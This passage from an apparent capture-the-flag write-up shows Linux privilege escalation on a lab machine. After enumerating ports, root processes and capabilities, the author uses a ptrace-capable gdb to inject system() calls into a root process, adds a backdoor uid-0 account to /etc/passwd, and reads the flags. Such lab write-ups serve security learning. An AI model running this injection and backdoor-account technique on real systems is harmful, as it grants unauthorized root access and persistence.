drwxr-xr-x 110 root root 4096 Jun 27 17:34 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x   2 root root 4096 Jun 21 23:02 .
drwxr-xr-x 110 root root 4096 Jun 27 17:34 ..
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rwxr-xr-x   1 root root  813 Feb 25  2020 man-db
-rwxr-xr-x   1 root root  403 Aug  5  2021 update-notifier-common
```

Enumerated active ports:

```
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:25                  :::*                    LISTEN      -
```

gdb and sudo tokens:

```
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)
gdb was found in PATH

Files with capabilities (limited to 50):
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/gdb = cap_sys_ptrace+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep

╔══════════╣ Readable files belonging to root and readable by me but not world readable
developer@faculty:~$ id
uid=1001(developer) gid=1002(developer) groups=1002(developer),1001(debug),1003(faculty)
-rwxr-x--- 1 root debug 8440200 Dec  8  2021 /usr/bin/gdb
```

Enumerated root processes:

```
developer@faculty:~$ ps -aux | grep root | grep -v '\['
root           1  0.0  0.5 170428 11672 ?        Ss   Jun30   3:20 /sbin/init maybe-ubiquity
root         465  0.0  0.7  68524 15000 ?        S<s  Jun30   0:16 /lib/systemd/systemd-journald
root         493  0.0  0.2  22344  5812 ?        Ss   Jun30   0:03 /lib/systemd/systemd-udevd
root         619  0.0  0.8 214604 17952 ?        SLsl Jun30   0:32 /sbin/multipathd -d -s
root         658  0.0  0.2  99896  5892 ?        Ssl  Jun30   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root         659  0.0  0.5  46324 10628 ?        Ss   Jun30   0:00 /usr/bin/VGAuthService
root         660  0.1  0.4 310260  8424 ?        Ssl  Jun30   5:32 /usr/bin/vmtoolsd
root         684  0.0  0.4 238080  9168 ?        Ssl  Jun30   0:07 /usr/lib/accountsservice/accounts-daemon
root         699  0.0  0.1  81956  3724 ?        Ssl  Jun30   0:15 /usr/sbin/irqbalance --foreground
root         703  0.0  0.8  26896 17980 ?        Ss   Jun30   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         705  0.0  0.4 236436  8948 ?        Ssl  Jun30   0:00 /usr/lib/policykit-1/polkitd --no-debug
root         729  0.0  0.3  17348  7736 ?        Ss   Jun30   0:04 /lib/systemd/systemd-logind
root         735  0.0  0.6 395492 13392 ?        Ssl  Jun30   0:00 /usr/lib/udisks2/udisksd
root         750  0.0  0.6 318820 13476 ?        Ssl  Jun30   0:00 /usr/sbin/ModemManager
root         902  0.0  0.1   5568  2888 ?        Ss   Jun30   0:03 /usr/sbin/cron -f
root         903  0.0  0.9 194680 19980 ?        Ss   Jun30   0:19 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)
root         904  0.0  0.1   7248  3224 ?        S    Jun30   0:00 /usr/sbin/CRON -f
root         911  0.0  0.0   2608   604 ?        Ss   Jun30   0:00 /bin/sh -c bash /root/service_check.sh
root         912  0.0  0.1   5648  3008 ?        S    Jun30   0:26 bash /root/service_check.sh
root         921  0.0  0.0  55276  1528 ?        Ss   Jun30   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
root         963  0.0  0.0   2860  1824 tty1     Ss+  Jun30   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root        1570  0.0  0.2  38072  4512 ?        Ss   Jun30   0:01 /usr/lib/postfix/sbin/master -w
root      177863  0.0  0.0   4260   520 ?        S    14:04   0:00 sleep 20
develop+  177865  0.0  0.0   5192   720 pts/0    S+   14:04   0:00 grep --color=auto root
```

## Process Injection using gdb

Injected a test PoC

```
developer@faculty:~$ gdb -q -n -p 730 # root  730  0.0  0.9  26896 18176 ?        Ss   01:28   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run│
-startup-triggers
Attaching to process 730
Reading symbols from /usr/bin/python3.8...
(No debugging symbols found in /usr/bin/python3.8)
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...
Reading symbols from /usr/lib/debug/.build-id/18/78e6b475720c7c51969e69ab2d276fae6d1dee.debug...
Reading symbols from /lib/x86_64-linux-gnu/libpthread.so.0...
Reading symbols from /usr/lib/debug/.build-id/7b/4536f41cdaa5888408e82d0836e33dcf436466.debug...
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Reading symbols from /lib/x86_64-linux-gnu/libdl.so.2...
Reading symbols from /usr/lib/debug/.build-id/c0/f40155b3f8bf8c494fa800f9ab197ebe20ed6e.debug...
Reading symbols from /lib/x86_64-linux-gnu/libutil.so.1...
Reading symbols from /usr/lib/debug/.build-id/4f/3ee75c38f09d6346de1e8eca0f8d8a41071d9f.debug...
Reading symbols from /lib/x86_64-linux-gnu/libm.so.6...
Reading symbols from /usr/lib/debug/.build-id/fe/91b4090ea04c1559ff71dd9290062776618891.debug...
Reading symbols from /lib/x86_64-linux-gnu/libexpat.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libexpat.so.1)
Reading symbols from /lib/x86_64-linux-gnu/libz.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libz.so.1)
Reading symbols from /lib64/ld-linux-x86-64.so.2...
Reading symbols from /usr/lib/debug/.build-id/45/87364908de169dec62ffa538170118c1c3a078.debug...
Reading symbols from /lib/x86_64-linux-gnu/libnss_files.so.2...
Reading symbols from /usr/lib/debug/.build-id/45/da81f0ac3660e3c3cb947c6244151d879ed9e8.debug...
Reading symbols from /usr/lib/python3.8/lib-dynload/_json.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3.8/lib-dynload/_json.cpython-38-x86_64-linux-gnu.so)
Reading symbols from /usr/lib/python3/dist-packages/gi/_gi.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3/dist-packages/gi/_gi.cpython-38-x86_64-linux-gnu.so)
Reading symbols from /lib/x86_64-linux-gnu/libglib-2.0.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libglib-2.0.so.0)
Reading symbols from /lib/x86_64-linux-gnu/libgobject-2.0.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libgobject-2.0.so.0)
Reading symbols from /lib/x86_64-linux-gnu/libgirepository-1.0.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libgirepository-1.0.so.1)
Reading symbols from /lib/x86_64-linux-gnu/libffi.so.7...
(No debugging symbols found in /lib/x86_64-linux-gnu/libffi.so.7)
Reading symbols from /lib/x86_64-linux-gnu/libpcre.so.3...
(No debugging symbols found in /lib/x86_64-linux-gnu/libpcre.so.3)
Reading symbols from /lib/x86_64-linux-gnu/libgmodule-2.0.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libgmodule-2.0.so.0)
Reading symbols from /lib/x86_64-linux-gnu/libgio-2.0.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libgio-2.0.so.0)
Reading symbols from /lib/x86_64-linux-gnu/libmount.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libmount.so.1)
Reading symbols from /lib/x86_64-linux-gnu/libselinux.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libselinux.so.1)
Reading symbols from /lib/x86_64-linux-gnu/libresolv.so.2...
Reading symbols from /usr/lib/debug/.build-id/45/19041bde5b859c55798ac0745b0b6199cb7d94.debug...
Reading symbols from /lib/x86_64-linux-gnu/libblkid.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/libblkid.so.1)
Reading symbols from /lib/x86_64-linux-gnu/libpcre2-8.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libpcre2-8.so.0)
Reading symbols from /usr/lib/python3/dist-packages/_dbus_bindings.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3/dist-packages/_dbus_bindings.cpython-38-x86_64-linux-gnu.so)
Reading symbols from /lib/x86_64-linux-gnu/libdbus-1.so.3...
(No debugging symbols found in /lib/x86_64-linux-gnu/libdbus-1.so.3)
Reading symbols from /lib/x86_64-linux-gnu/libsystemd.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libsystemd.so.0)
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
Reading symbols from /usr/lib/debug/.build-id/ce/016c975d94bc4770ed8c62d45dea6b71405a2c.debug...
--Type <RET> for more, q to quit, c to continue without paging--
Reading symbols from /lib/x86_64-linux-gnu/liblzma.so.5...
(No debugging symbols found in /lib/x86_64-linux-gnu/liblzma.so.5)
Reading symbols from /lib/x86_64-linux-gnu/liblz4.so.1...
(No debugging symbols found in /lib/x86_64-linux-gnu/liblz4.so.1)
Reading symbols from /lib/x86_64-linux-gnu/libgcrypt.so.20...
(No debugging symbols found in /lib/x86_64-linux-gnu/libgcrypt.so.20)
Reading symbols from /lib/x86_64-linux-gnu/libgpg-error.so.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libgpg-error.so.0)
Reading symbols from /usr/lib/python3/dist-packages/_dbus_glib_bindings.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3/dist-packages/_dbus_glib_bindings.cpython-38-x86_64-linux-gnu.so)
Reading symbols from /usr/lib/python3.8/lib-dynload/_bz2.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3.8/lib-dynload/_bz2.cpython-38-x86_64-linux-gnu.so)
Reading symbols from /lib/x86_64-linux-gnu/libbz2.so.1.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libbz2.so.1.0)
Reading symbols from /usr/lib/python3.8/lib-dynload/_lzma.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3.8/lib-dynload/_lzma.cpython-38-x86_64-linux-gnu.so)
0x00007ff44d428967 in __GI___poll (fds=0xb56a60, nfds=3, timeout=-1) at ../sysdeps/unix/sysv/linux/poll.c:29
29      ../sysdeps/unix/sysv/linux/poll.c: No such file or directory.
(gdb) call (size_t) system("touch /dev/shm/test")
[Detaching after vfork from child process 42680]
$1 = 0
(gdb)

(gdb) shell ls -al /dev/shm
total 0
drwxrwxrwt  3 root root   80 Jul  3 22:17 .
drwxr-xr-x 18 root root 3960 Jul  3 01:28 ..
drwx------  4 root root   80 Jul  3 01:28 multipath
-rw-r--r--  1 root root    0 Jul  3 22:17 test
```

Injected a second root account and logged in as root:

```
(gdb) call (size_t) system("echo 'root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash' >> /etc/passwd")
[Detaching after vfork from child process 42811]
$2 = 0
(gdb) shell cat /etc/passwd | grep root2
root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash
...
developer@faculty:~$ su root2
Password:
root@faculty:/home/developer# id && hostanme && cat /root/root.txt
uid=0(root) gid=0(root) groups=0(root)

Command 'hostanme' not found, did you mean:

  command 'hostname' from deb hostname (3.23)

Try: apt install <deb name>

root@faculty:/home/developer# id && hostname && cat /root/root.txt
uid=0(root) gid=0(root) groups=0(root)
faculty
396abb69e1ab3a7e788693255bbd5e9e
```

# Trophy

![Faculty%20afc566c4b14f4de68ef8c1192ab0727a](../../zzz_res/attachments/Faculty%20afc566c4b14f4de68ef8c1192ab0727a%2013.png)

>[!success]
>**User.txt**
>9a8e4ef05376fee9a302d93c3cf172f7

>[!success]
>**Root.txt**
>396abb69e1ab3a7e788693255bbd5e9e